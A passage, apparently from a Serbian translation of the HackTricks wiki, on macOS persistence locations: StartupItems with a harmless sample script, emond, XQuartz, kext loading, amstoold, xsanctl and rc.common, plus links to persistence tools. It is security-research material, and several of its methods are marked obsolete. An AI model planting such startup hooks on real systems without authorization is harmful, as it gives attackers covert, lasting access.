Pobrinite se da su i rc script i datoteka `StartupParameters.plist` pravilno smešteni unutar direktorijuma **StartupItem**, kako bi ih proces pokretanja prepoznao i koristio.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Ne mogu da nađem ovu komponentu na mom macOS pa za više informacija pogledajte writeup

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Uveden od strane Apple-a, **emond** je mehanizam za logovanje koji deluje nedovoljno razvijen ili moguće napušten, ali je i dalje dostupan. Iako nije naročito koristan za administratora Mac-a, ova neupadljiva usluga može poslužiti kao suptilan persistence metod za napadače, verovatno neprimećen većini macOS administratora.

Onima koji znaju za njegovo postojanje, identifikovanje eventualne maliciozne upotrebe **emond** je jednostavno. Sistemski LaunchDaemon za ovu uslugu traži skripte za izvršavanje u jednom direktorijumu. Za proveru toga može se koristiti sledeća komanda:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Location

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Zahteva root privilegije
- **Okidač**: Uz XQuartz

#### Description & Exploit

XQuartz je **više nije instaliran u macOS**, pa ako želite više informacija pogledajte writeup.

### ~~kext~~

> [!CAUTION]
> Instalacija kext-a je toliko komplikovana čak i kao root da ovo neću smatrati metodom za bekstvo iz sandboxa niti za persistenciju (osim ako imate exploit)

#### Location

Da biste instalirali KEXT kao startup stavku, mora biti **instaliran u jednoj od sledećih lokacija**:

- `/System/Library/Extensions`
- KEXT fajlovi ugrađeni u operativni sistem OS X.
- `/Library/Extensions`
- KEXT fajlovi koje instalira softver treće strane

Možete izlistati trenutno učitane kext fajlove pomoću:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
For more information about [**kernel extensions check this section**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Analiza: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Lokacija

- **`/usr/local/bin/amstoold`**
- Root required

#### Opis i eksploatacija

Navodno `plist` iz `/System/Library/LaunchAgents/com.apple.amstoold.plist` je koristio ovaj binary dok je izlagao XPC service... stvar je u tome da binary nije postojao, pa ste mogli tamo postaviti nešto i kada se XPC service pozove vaš binary će biti pokrenut.

Više ga više ne mogu pronaći na mom macOS-u.

### ~~xsanctl~~

Analiza: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Lokacija

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root required
- **Okidač**: Kada se servis pokrene (retko)

#### Opis i iskorišćavanje

Navodno nije često da se ovaj skript pokreće i nisam ga uspeo pronaći na mom macOS-u, pa ako želiš više informacija pogledaj writeup.

### ~~/etc/rc.common~~

> [!CAUTION] > **Ovo ne radi u modernim verzijama MacOS-a**

Moguće je takođe ovde postaviti **komande koje će se izvršiti pri pokretanju.** Primer regularnog rc.common skripta:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Tehnike i alati za perzistenciju

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## Reference

- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../banners/hacktricks-training.md}}
